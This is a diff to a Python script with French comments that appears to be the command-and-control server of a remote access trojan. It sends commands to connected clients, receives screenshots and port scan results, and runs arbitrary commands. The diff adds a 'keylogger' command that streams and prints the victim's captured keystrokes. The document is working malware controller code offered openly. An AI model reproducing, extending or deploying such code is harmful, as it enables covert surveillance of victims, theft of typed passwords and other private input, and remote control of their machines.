@@ -16,6 +16,7 @@ def accept_socket(s):
     conn, address = s.accept()
     print(f"New connection from {address} !")
     send_command(conn)
+
     conn.close()
 
 # Envoyer une commande
@@ -29,10 +30,19 @@ def send_command(conn):
             print("Closing connection.")
             conn.close()
             break
+
         elif command == "capture":
             receive_screen(conn)
+
         elif command.startswith("scan"):
             receive_scan(conn)
+
+        elif command == "keylogger":
+            receive_keylogger(conn)
+
+        elif command == "stop":
+            conn.send(b"stop")
+
         else:
             result = conn.recv(4096).decode("utf-8", errors="replace") # Recoie le résultat
             print(result)  # Affichage du résultat côté serveur
@@ -52,12 +62,21 @@ def receive_screen(conn):
     img = Image.frombytes("RGB", (width, height), img_data) # Reconstruit l'image et l'affiche
     img.show()
 
-# Fonction qui recoit les résultats su scanner de port 
+# Fonction qui recoit les résultats du scanner de port 
 def receive_scan(conn):
     scan_result = conn.recv(4096)
     if scan_result:
         scan_result = scan_result.decode("utf-8", errors="replace")
         print(scan_result)
+
+# Keylogger
+def receive_keylogger(conn):
+    print("Listening for keylogger data...")
+    while True:
+        key = conn.recv(1024)
+        if not key:
+            break
+        print(f"key: {key.decode('utf-8', errors='replace')}")
 
 
 if __name__ == "__main__":
